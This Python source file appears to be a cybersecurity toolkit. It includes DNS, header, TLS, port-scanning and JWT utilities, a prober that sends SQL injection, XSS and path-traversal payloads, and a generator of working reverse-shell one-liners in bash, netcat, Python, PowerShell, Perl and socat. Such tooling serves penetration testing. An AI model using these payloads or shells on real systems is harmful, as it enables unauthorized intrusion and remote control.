"""
SWA AI — Cyber Expert Utility Toolkit
Comprehensive suite of interactive and semi-automatic cybersecurity tools:
- DNS Records & SPF/DMARC Email Security Analyzer
- HTTP Security Headers Evaluator & Letter-Grader (A+ to F)
- SSL/TLS Certificate Deep Inspector & Expiration Tracker
- High-Speed Asynchronous TCP Port Prober & Service Detector
- WHOIS & IP / ASN Threat Intelligence
- Cryptography, Encoding, Hashing & JWT Debugger
- Subnet & CIDR Network Calculator
- Targeted Single-Vector Vulnerability Prober (SQLi, XSS, LFI, SSRF, CORS, Open Redirect)
- Authorized Penetration Testing Shell & Payload Reference Generator
"""

import asyncio
import base64
import datetime
import hashlib
import html
import ipaddress
import json
import re
import socket
import ssl
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote, unquote
from typing import Dict, List, Any, Optional

import httpx


# =====================================================================
# 1. DNS & Email Security (SPF / DMARC) Tool
# =====================================================================
class DNSLookupTool:
    @staticmethod
    async def resolve(domain: str) -> Dict[str, Any]:
        """Resolves DNS records and inspects SPF / DMARC email spoofing defenses."""
        # Sanitize domain
        domain = domain.strip().lower()
        if "://" in domain:
            domain = urlparse(domain).hostname or domain
        domain = domain.split("/")[0].split(":")[0]

        results = {
            "domain": domain,
            "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
            "records": {},
            "email_security": {
                "spf_found": False,
                "spf_record": None,
                "dmarc_found": False,
                "dmarc_record": None,
                "posture": "UNKNOWN",
                "notes": []
            }
        }

        # Try dnspython first if installed
        has_dnspython = False
        try:
            import dns.resolver
            has_dnspython = True
            resolver = dns.resolver.Resolver()
            resolver.timeout = 3.0
            resolver.lifetime = 3.0

            record_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"]
            for rtype in record_types:
                try:
                    answers = resolver.resolve(domain, rtype)
                    results["records"][rtype] = [str(r).strip('"') for r in answers]
                except Exception:
                    results["records"][rtype] = []

            # Check DMARC at _dmarc.<domain>
            try:
                dmarc_answers = resolver.resolve(f"_dmarc.{domain}", "TXT")
                for r in dmarc_answers:
                    txt = str(r).strip('"')
                    if "v=dmarc1" in txt.lower():
                        results["email_security"]["dmarc_found"] = True
                        results["email_security"]["dmarc_record"] = txt
                        break
            except Exception:
                pass

        except ImportError:
            # Pure standard library fallback using socket
            results["records"]["A"] = []
            results["records"]["AAAA"] = []
            try:
                loop = asyncio.get_running_loop()
                addr_info = await loop.getaddrinfo(domain, None)
                for item in addr_info:
                    ip = item[4][0]
                    if ":" in ip:
                        if ip not in results["records"]["AAAA"]:
                            results["records"]["AAAA"].append(ip)
                    else:
                        if ip not in results["records"]["A"]:
                            results["records"]["A"].append(ip)
            except Exception as e:
                results["records"]["error"] = str(e)

        # Inspect TXT records for SPF
        txt_records = results["records"].get("TXT", [])
        for txt in txt_records:
            if "v=spf1" in txt.lower():
                results["email_security"]["spf_found"] = True
                results["email_security"]["spf_record"] = txt
                break

        # Evaluate Email Security Posture
        spf = results["email_security"]["spf_found"]
        dmarc = results["email_security"]["dmarc_found"]
        notes = []

        if spf and dmarc:
            results["email_security"]["posture"] = "EXCELLENT"
            notes.append("Both SPF and DMARC are deployed to prevent domain impersonation.")
        elif spf and not dmarc:
            results["email_security"]["posture"] = "PARTIAL"
            notes.append("SPF record present, but DMARC policy (_dmarc." + domain + ") is missing.")
        elif not spf and dmarc:
            results["email_security"]["posture"] = "PARTIAL"
            notes.append("DMARC is present, but SPF record is missing.")
        else:
            results["email_security"]["posture"] = "VULNERABLE"
            notes.append("Neither SPF nor DMARC is configured. Attackers may spoof emails from this domain.")

        results["email_security"]["notes"] = notes
        return results


# =====================================================================
# 2. HTTP Security Headers Tool
# =====================================================================
class SecurityHeadersTool:
    RECOMMENDED_HEADERS = {
        "strict-transport-security": {
            "name": "Strict-Transport-Security (HSTS)",
            "weight": 20,
            "description": "Enforces HTTPS connections and blocks SSL stripping attacks.",
            "recommendation": "max-age=31536000; includeSubDomains; preload"
        },
        "content-security-policy": {
            "name": "Content-Security-Policy (CSP)",
            "weight": 25,
            "description": "Restricts resource origins to neutralize Cross-Site Scripting (XSS) and data injection.",
            "recommendation": "default-src 'self'; script-src 'self'; object-src 'none';"
        },
        "x-frame-options": {
            "name": "X-Frame-Options",
            "weight": 15,
            "description": "Prevents clickjacking by controlling if the page can be rendered in a <frame> or <iframe>.",
            "recommendation": "DENY or SAMEORIGIN"
        },
        "x-content-type-options": {
            "name": "X-Content-Type-Options",
            "weight": 10,
            "description": "Stops MIME type sniffing attacks.",
            "recommendation": "nosniff"
        },
        "referrer-policy": {
            "name": "Referrer-Policy",
            "weight": 10,
            "description": "Protects sensitive URL parameters and paths from leaking in Referer headers.",
            "recommendation": "strict-origin-when-cross-origin"
        },
        "permissions-policy": {
            "name": "Permissions-Policy",
            "weight": 10,
            "description": "Controls browser features and APIs (geolocation, camera, microphone).",
            "recommendation": "geolocation=(), camera=(), microphone=()"
        },
        "cross-origin-opener-policy": {
            "name": "Cross-Origin-Opener-Policy (COOP)",
            "weight": 5,
            "description": "Isolates browsing context to mitigate Spectre-style side-channel attacks.",
            "recommendation": "same-origin"
        },
        "cross-origin-resource-policy": {
            "name": "Cross-Origin-Resource-Policy (CORP)",
            "weight": 5,
            "description": "Protects sensitive server assets from being embedded by cross-origin attackers.",
            "recommendation": "same-origin"
        }
    }

    LEAK_HEADERS = ["server", "x-powered-by", "x-aspnet-version", "x-runtime"]

    @classmethod
    async def evaluate(cls, target_url: str) -> Dict[str, Any]:
        """Audits HTTP response headers, grades security posture from A+ to F."""
        if not target_url.startswith(("http://", "https://")):
            target_url = f"https://{target_url}"

        async with httpx.AsyncClient(verify=False, timeout=8.0, follow_redirects=True) as client:
            try:
                resp = await client.get(target_url)
                headers_lower = {k.lower(): v for k, v in resp.headers.items()}
                status_code = resp.status_code
                final_url = str(resp.url)
            except Exception as e:
                return {
                    "target_url": target_url,
                    "error": f"Failed to connect to target: {str(e)}",
                    "score": 0,
                    "grade": "F"
                }

        score = 0
        max_score = sum(h["weight"] for h in cls.RECOMMENDED_HEADERS.values())
        header_results = []
        leakage_results = []

        # Check recommended security headers
        for h_key, meta in cls.RECOMMENDED_HEADERS.items():
            present = h_key in headers_lower
            val = headers_lower.get(h_key)
            if present:
                score += meta["weight"]
            header_results.append({
                "header": meta["name"],
                "key": h_key,
                "status": "PASS" if present else "MISSING",
                "value": val,
                "weight": meta["weight"],
                "description": meta["description"],
                "recommendation": meta["recommendation"]
            })

        # Check for information leakage banners
        for l_key in cls.LEAK_HEADERS:
            if l_key in headers_lower:
                leakage_results.append({
                    "header": l_key,
                    "value": headers_lower[l_key],
                    "risk": f"Discloses underlying technology: {headers_lower[l_key]}"
                })
                # Deduct 5 points per banner leak
                score = max(0, score - 5)

        # Normalize score to 100
        normalized_score = int((score / max_score) * 100)

        # Grade calculation
        if normalized_score >= 95:
            grade = "A+"
        elif normalized_score >= 85:
            grade = "A"
        elif normalized_score >= 70:
            grade = "B"
        elif normalized_score >= 50:
            grade = "C"
        elif normalized_score >= 35:
            grade = "D"
        else:
            grade = "F"

        return {
            "target_url": target_url,
            "final_url": final_url,
            "status_code": status_code,
            "score": normalized_score,
            "grade": grade,
            "security_headers": header_results,
            "leakage_headers": leakage_results,
            "all_headers": dict(resp.headers)
        }


# =====================================================================
# 3. SSL / TLS Certificate Inspector Tool
# =====================================================================
class SSLCertificateTool:
    @staticmethod
    async def inspect(target: str, port: int = 443) -> Dict[str, Any]:
        """Deep TLS handshake inspection: issuer, validity, SANs, days to expiry."""
        target = target.strip()
        if "://" in target:
            target = urlparse(target).hostname or target
        target = target.split("/")[0].split(":")[0]

        loop = asyncio.get_running_loop()

        def _tls_probe():
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            with socket.create_connection((target, port), timeout=6.0) as sock:
                with ctx.wrap_socket(sock, server_hostname=target) as ssock:
                    cert = ssock.getpeercert(binary_form=False)
                    # If binary form needed or cert is empty when verify_mode is NONE:
                    bin_cert = ssock.getpeercert(binary_form=True)
                    tls_version = ssock.version()
                    cipher = ssock.cipher()
                    return cert, bin_cert, tls_version, cipher

        try:
            cert, bin_cert, tls_version, cipher = await loop.run_in_executor(None, _tls_probe)
        except Exception as e:
            return {
                "target": target,
                "port": port,
                "error": f"TLS Connection failed: {str(e)}",
                "valid": False
            }

        # Parse certificate details
        subject_dict = {}
        issuer_dict = {}
        sans = []
        valid_from = None
        valid_to = None
        days_remaining = None
        is_expired = False

        # Try cryptography library if available for full X.509 parsing
        try:
            from cryptography import x509
            from cryptography.hazmat.backends import default_backend
            parsed_cert = x509.load_der_x509_certificate(bin_cert, default_backend())

            for attr in parsed_cert.subject:
                subject_dict[attr.oid._name] = attr.value
            for attr in parsed_cert.issuer:
                issuer_dict[attr.oid._name] = attr.value

            valid_from = parsed_cert.not_valid_before_utc.isoformat()
            valid_to = parsed_cert.not_valid_after_utc.isoformat()
            now = datetime.datetime.now(datetime.timezone.utc)
            delta = parsed_cert.not_valid_after_utc - now
            days_remaining = delta.days
            is_expired = days_remaining < 0

            try:
                san_ext = parsed_cert.extensions.get_extension_for_oid(x509.ExtensionOID.SUBJECT_ALTERNATIVE_NAME)
                sans = san_ext.value.get_values_for_type(x509.DNSName)
            except Exception:
                pass

        except Exception:
            # Fallback to standard ssl dict parsing if verified or available
            if cert:
                for item in cert.get("subject", []):
                    for k, v in item: subject_dict[k] = v
                for item in cert.get("issuer", []):
                    for k, v in item: issuer_dict[k] = v
                valid_from = cert.get("notBefore")
                valid_to = cert.get("notAfter")
                sans = [v for k, v in cert.get("subjectAltName", []) if k == "DNS"]

        return {
            "target": target,
            "port": port,
            "valid": True,
            "tls_version": tls_version,
            "cipher_suite": cipher[0] if cipher else None,
            "cipher_bits": cipher[2] if cipher else None,
            "subject": subject_dict,
            "issuer": issuer_dict,
            "common_name": subject_dict.get("commonName") or subject_dict.get("CN"),
            "issuer_organization": issuer_dict.get("organizationName") or issuer_dict.get("O"),
            "valid_from": valid_from,
            "valid_to": valid_to,
            "days_remaining": days_remaining,
            "is_expired": is_expired,
            "expiring_soon": (days_remaining is not None and 0 <= days_remaining <= 30),
            "san_count": len(sans),
            "sans": sans[:30]
        }


# =====================================================================
# 4. Asynchronous TCP Port Prober Tool
# =====================================================================
class PortProberTool:
    DEFAULT_PORTS = [
        21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995,
        1433, 1521, 3000, 3306, 3389, 5432, 5900, 6379, 8000, 8080, 8443, 8888, 27017
    ]

    PORT_SERVICES = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 465: "SMTPS",
        587: "SMTP Submission", 993: "IMAPS", 995: "POP3S", 1433: "MSSQL",
        1521: "Oracle", 3000: "Node / WebApp", 3306: "MySQL", 3389: "RDP",
        5432: "PostgreSQL", 5900: "VNC", 6379: "Redis", 8000: "HTTP Dev / Alt",
        8080: "HTTP Proxy / Web", 8443: "HTTPS Alt", 8888: "HTTP Alt", 27017: "MongoDB"
    }

    @classmethod
    async def scan(cls, target: str, ports: Optional[List[int]] = None, timeout: float = 1.5) -> Dict[str, Any]:
        """Probes target TCP ports concurrently with banner grab."""
        target = target.strip()
        if "://" in target:
            target = urlparse(target).hostname or target
        target = target.split("/")[0].split(":")[0]

        ports_to_check = ports or cls.DEFAULT_PORTS
        open_ports = []
        closed_ports_count = 0

        async def _check_port(p: int):
            try:
                conn = asyncio.open_connection(target, p)
                reader, writer = await asyncio.wait_for(conn, timeout=timeout)
                banner = ""
                # Attempt fast banner read
                try:
                    writer.write(b"HEAD / HTTP/1.0\r\n\r\n")
                    await writer.drain()
                    raw = await asyncio.wait_for(reader.read(256), timeout=0.8)
                    banner = raw.decode("utf-8", errors="ignore").strip().splitlines()[0] if raw else ""
                except Exception:
                    pass
                writer.close()
                await writer.wait_closed()

                service = cls.PORT_SERVICES.get(p, "Unknown Service")
                return {"port": p, "state": "OPEN", "service": service, "banner": banner[:80]}
            except Exception:
                return None

        results = await asyncio.gather(*[_check_port(p) for p in ports_to_check], return_exceptions=True)
        for r in results:
            if isinstance(r, dict) and r:
                open_ports.append(r)
            else:
                closed_ports_count += 1

        return {
            "target": target,
            "total_scanned": len(ports_to_check),
            "open_count": len(open_ports),
            "closed_count": closed_ports_count,
            "open_ports": sorted(open_ports, key=lambda x: x["port"])
        }


# =====================================================================
# 5. WHOIS & IP Intelligence Tool
# =====================================================================
class WhoisIpTool:
    @staticmethod
    async def lookup(target: str) -> Dict[str, Any]:
        """Queries RDAP / IP Threat Intelligence for domain or IP address."""
        target = target.strip()
        if "://" in target:
            target = urlparse(target).hostname or target
        target = target.split("/")[0].split(":")[0]

        is_ip = bool(re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", target) or ":" in target)

        # Resolve IP if domain
        resolved_ip = target
        if not is_ip:
            try:
                loop = asyncio.get_running_loop()
                addr_info = await loop.getaddrinfo(target, None)
                resolved_ip = addr_info[0][4][0]
            except Exception:
                pass

        intel = {
            "query": target,
            "resolved_ip": resolved_ip,
            "is_ip": is_ip,
            "asn": None,
            "org": None,
            "country": None,
            "city": None,
            "isp": None,
            "rdap_source": None
        }

        # Query RDAP
        async with httpx.AsyncClient(timeout=5.0) as client:
            try:
                if is_ip or resolved_ip:
                    # Query IP RDAP endpoint
                    r = await client.get(f"https://rdap.arin.net/registry/ip/{resolved_ip}")
                    if r.status_code == 200:
                        data = r.json()
                        intel["rdap_source"] = "ARIN"
                        intel["org"] = data.get("name")
                        for entity in data.get("entities", []):
                            for vcard in entity.get("vcardArray", [[]])[1]:
                                if vcard[0] == "fn":
                                    intel["isp"] = vcard[3]
                                    break
            except Exception:
                pass

        return intel


# =====================================================================
# 6. Cryptography, Hash & JWT Hub
# =====================================================================
class CryptoEncoderTool:
    @staticmethod
    def encode_decode(text: str, operation: str) -> Dict[str, Any]:
        """Encodes or decodes text across Base64, Hex, URL, and HTML entities."""
        text_bytes = text.encode("utf-8", errors="ignore")
        output = ""
        error = None

        try:
            if operation == "base64_encode":
                output = base64.b64encode(text_bytes).decode("utf-8")
            elif operation == "base64_decode":
                output = base64.b64decode(text.strip()).decode("utf-8", errors="replace")
            elif operation == "url_encode":
                output = quote(text)
            elif operation == "url_decode":
                output = unquote(text)
            elif operation == "hex_encode":
                output = text_bytes.hex()
            elif operation == "hex_decode":
                cleaned = re.sub(r"[^0-9a-fA-F]", "", text)
                output = bytes.fromhex(cleaned).decode("utf-8", errors="replace")
            elif operation == "html_encode":
                output = html.escape(text)
            elif operation == "html_decode":
                output = html.unescape(text)
            else:
                error = f"Unknown operation: {operation}"
        except Exception as e:
            error = str(e)

        return {"input": text, "operation": operation, "output": output, "error": error}

    @staticmethod
    def calculate_hashes(text: str) -> Dict[str, Any]:
        """Computes standard cybersecurity cryptographic digests (MD5, SHA1, SHA256, SHA512, NTLM)."""
        b = text.encode("utf-8", errors="ignore")
        
        # NTLM calculation (MD4 of UTF-16LE)
        ntlm_hash = ""
        try:
            ntlm_hash = hashlib.new("md4", text.encode("utf-16le")).hexdigest()
        except Exception:
            ntlm_hash = "MD4 algorithm not available on this platform"

        return {
            "input": text,
            "length": len(text),
            "md5": hashlib.md5(b).hexdigest(),
            "sha1": hashlib.sha1(b).hexdigest(),
            "sha256": hashlib.sha256(b).hexdigest(),
            "sha512": hashlib.sha512(b).hexdigest(),
            "ntlm": ntlm_hash
        }

    @staticmethod
    def inspect_jwt(token: str) -> Dict[str, Any]:
        """Inspects, decodes, and validates JSON Web Tokens (JWT)."""
        token = token.strip()
        parts = token.split(".")
        if len(parts) != 3:
            return {"error": "Invalid JWT format. Expected 3 base64url segments separated by dots."}

        def _b64url_decode(s: str) -> Dict[str, Any]:
            # Add padding
            rem = len(s) % 4
            if rem > 0:
                s += "=" * (4 - rem)
            decoded_bytes = base64.urlsafe_b64decode(s)
            return json.loads(decoded_bytes.decode("utf-8", errors="replace"))

        header = {}
        payload = {}
        try:
            header = _b64url_decode(parts[0])
        except Exception as e:
            return {"error": f"Failed to decode JWT Header: {str(e)}"}

        try:
            payload = _b64url_decode(parts[1])
        except Exception as e:
            return {"error": f"Failed to decode JWT Payload: {str(e)}"}

        # Expiration analysis
        exp_timestamp = payload.get("exp")
        exp_readable = None
        is_expired = False
        if exp_timestamp and isinstance(exp_timestamp, (int, float)):
            exp_date = datetime.datetime.fromtimestamp(exp_timestamp, datetime.timezone.utc)
            exp_readable = exp_date.isoformat()
            is_expired = datetime.datetime.now(datetime.timezone.utc) > exp_date

        iat_timestamp = payload.get("iat")
        iat_readable = None
        if iat_timestamp and isinstance(iat_timestamp, (int, float)):
            iat_readable = datetime.datetime.fromtimestamp(iat_timestamp, datetime.timezone.utc).isoformat()

        # Security check: 'none' algorithm
        alg = header.get("alg", "").lower()
        is_none_alg = (alg == "none")

        return {
            "valid_structure": True,
            "header": header,
            "payload": payload,
            "signature_hex": parts[2],
            "algorithm": header.get("alg"),
            "token_type": header.get("typ", "JWT"),
            "is_none_algorithm": is_none_alg,
            "issued_at": iat_readable,
            "expires_at": exp_readable,
            "is_expired": is_expired,
            "security_warnings": (
                ["CRITICAL: Token algorithm is 'none' (unsigned JWT authentication bypass)!"]
                if is_none_alg else []
            ) + (["Token is EXPIRED"] if is_expired else [])
        }


# =====================================================================
# 7. Subnet & CIDR Network Calculator Tool
# =====================================================================
class SubnetCalculatorTool:
    @staticmethod
    def calculate(cidr_str: str) -> Dict[str, Any]:
        """Calculates network range, netmask, usable hosts, and wildcard mask from CIDR notation."""
        cidr_str = cidr_str.strip()
        try:
            net = ipaddress.ip_network(cidr_str, strict=False)
            is_v4 = isinstance(net, ipaddress.IPv4Network)

            total_hosts = net.num_addresses
            usable_hosts = max(0, total_hosts - 2) if is_v4 and net.prefixlen < 31 else total_hosts

            first_ip = str(net.network_address + 1) if is_v4 and net.prefixlen < 31 else str(net.network_address)
            last_ip = str(net.broadcast_address - 1) if is_v4 and net.prefixlen < 31 else str(net.broadcast_address)

            # Wildcard mask for IPv4
            wildcard = ""
            if is_v4:
                netmask_ints = [int(x) for x in str(net.netmask).split(".")]
                wildcard = ".".join(str(255 - x) for x in netmask_ints)

            return {
                "input": cidr_str,
                "version": f"IPv{net.version}",
                "network_address": str(net.network_address),
                "broadcast_address": str(net.broadcast_address) if is_v4 else "N/A",
                "netmask": str(net.netmask),
                "wildcard_mask": wildcard if is_v4 else "N/A",
                "prefix_length": net.prefixlen,
                "total_addresses": total_hosts,
                "usable_hosts": usable_hosts,
                "first_usable_ip": first_ip,
                "last_usable_ip": last_ip,
                "is_private": net.is_private,
                "is_global": net.is_global
            }
        except Exception as e:
            return {"error": f"Invalid CIDR or IP address: {str(e)}"}


# =====================================================================
# 8. Targeted Single-Vector Vulnerability Prober (Semi-Auto Mode)
# =====================================================================
class TargetedVulnProberTool:
    @classmethod
    async def probe(cls, target_url: str, vuln_type: str, parameter: Optional[str] = None) -> Dict[str, Any]:
        """Instantly tests a specific URL and parameter for a chosen vulnerability vector."""
        if not target_url.startswith(("http://", "https://")):
            target_url = f"https://{target_url}"

        parsed = urlparse(target_url)
        q_params = parse_qs(parsed.query)
        param_name = parameter or (list(q_params.keys())[0] if q_params else "q")

        vuln_type = vuln_type.lower()
        test_payloads = []
        detection_signatures = []

        if vuln_type in ["sqli", "sql_injection"]:
            test_payloads = [
                ("'", "Single quote syntax break"),
                ("1' OR '1'='1", "Classic boolean bypass"),
                ("1 UNION SELECT null,null-- -", "UNION injection probe")
            ]
            detection_signatures = [
                r"you have an error in your sql syntax",
                r"warning: mysql_",
                r"unclosed quotation mark after the character string",
                r"pg_query\(\): query failed",
                r"sqlite3::query\(\):",
                r"ora-01756",
            ]
        elif vuln_type in ["xss", "cross_site_scripting"]:
            unique_mark = f"swaxss_{int(time.time())}"
            test_payloads = [
                (f"<script>{unique_mark}</script>", "Standard script tag reflection"),
                (f"\"><img src=x onerror={unique_mark}>", "Attribute escape reflection")
            ]
            detection_signatures = [unique_mark]
        elif vuln_type in ["lfi", "path_traversal"]:
            test_payloads = [
                ("../../../../etc/passwd", "Linux path traversal"),
                ("..\\..\\..\\windows\\win.ini", "Windows path traversal")
            ]
            detection_signatures = [r"root:.*:0:0:", r"\[extensions\]", r"\[fonts\]"]
        elif vuln_type in ["cors", "cors_misconfig"]:
            # Test custom Origin header
            evil_origin = "https://evil-attacker.example.com"
            async with httpx.AsyncClient(verify=False, timeout=5.0) as client:
                try:
                    r = await client.get(target_url, headers={"Origin": evil_origin})
                    acao = r.headers.get("access-control-allow-origin", "")
                    acac = r.headers.get("access-control-allow-credentials", "")
                    is_vulnerable = (acao == evil_origin or acao == "*")
                    return {
                        "target_url": target_url,
                        "vuln_type": "CORS Misconfiguration",
                        "tested_origin": evil_origin,
                        "vulnerable": is_vulnerable,
                        "access_control_allow_origin": acao,
                        "access_control_allow_credentials": acac,
                        "poc_curl": f"curl -i -H 'Origin: {evil_origin}' '{target_url}'",
                        "summary": "Server reflects arbitrary Origin headers in Access-Control-Allow-Origin!" if is_vulnerable else "CORS policy correctly restricted or absent."
                    }
                except Exception as e:
                    return {"target_url": target_url, "error": str(e), "vulnerable": False}

        # Execute tests for parameter-based probes
        async with httpx.AsyncClient(verify=False, timeout=5.0) as client:
            for probe_val, label in test_payloads:
                params_copy = dict(q_params)
                params_copy[param_name] = [probe_val]
                probe_url = urlunparse(parsed._replace(query=urlencode(params_copy, doseq=True)))

                try:
                    res = await client.get(probe_url)
                    body = res.text
                    for sig in detection_signatures:
                        if re.search(sig, body, re.IGNORECASE):
                            return {
                                "target_url": target_url,
                                "probe_url": probe_url,
                                "parameter": param_name,
                                "vuln_type": vuln_type.upper(),
                                "vulnerable": True,
                                "matched_signature": sig,
                                "payload_used": probe_val,
                                "status_code": res.status_code,
                                "response_snippet": body[:400],
                                "poc_curl": f"curl -i '{probe_url}'",
                                "evidence": f"Server reflected injection signature `{sig}` in HTTP response body."
                            }
                except Exception:
                    continue

        return {
            "target_url": target_url,
            "parameter": param_name,
            "vuln_type": vuln_type.upper(),
            "vulnerable": False,
            "summary": f"No immediate {vuln_type.upper()} vulnerability trigger observed on parameter '{param_name}' with baseline probes."
        }


# =====================================================================
# 9. Authorized Penetration Testing Shell Reference Generator
# =====================================================================
class ReverseShellGeneratorTool:
    @staticmethod
    def generate(ip: str, port: int, shell_type: str = "all") -> Dict[str, Any]:
        """Generates standard authorized reverse shell & payload syntax references."""
        ip = ip.strip()
        templates = {
            "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "bash_read": f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",
            "netcat_openbsd": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
            "netcat_traditional": f"nc -e /bin/sh {ip} {port}",
            "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
            "powershell": f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
            "socat": f"socat TCP:{ip}:{port} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane",
            "perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
        }

        if shell_type != "all" and shell_type in templates:
            return {"ip": ip, "port": port, "type": shell_type, "command": templates[shell_type]}

        return {"ip": ip, "port": port, "templates": templates}
